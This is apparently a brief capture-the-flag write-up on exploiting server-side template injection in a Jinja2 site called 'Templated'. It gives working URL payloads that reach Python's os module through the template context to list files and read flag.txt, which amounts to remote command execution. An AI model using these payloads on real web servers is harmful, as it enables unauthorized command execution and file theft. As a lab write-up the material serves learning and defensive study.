## Templated
There is a site, with a message that it's under construction. When I tried to open some page, I got a message "The page 'some' could not be found". The first thought was to try some template tags, so I use http://url/{{1+1}} and got "The page '2'...". At this point I realized that somehow I can run the python command here. I googled about template injection and found it https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
Well, there is nothing private in python so I can run any builtins throughout available at the template request.

```
To see what I can read
http://url/{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

To read
http://url/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```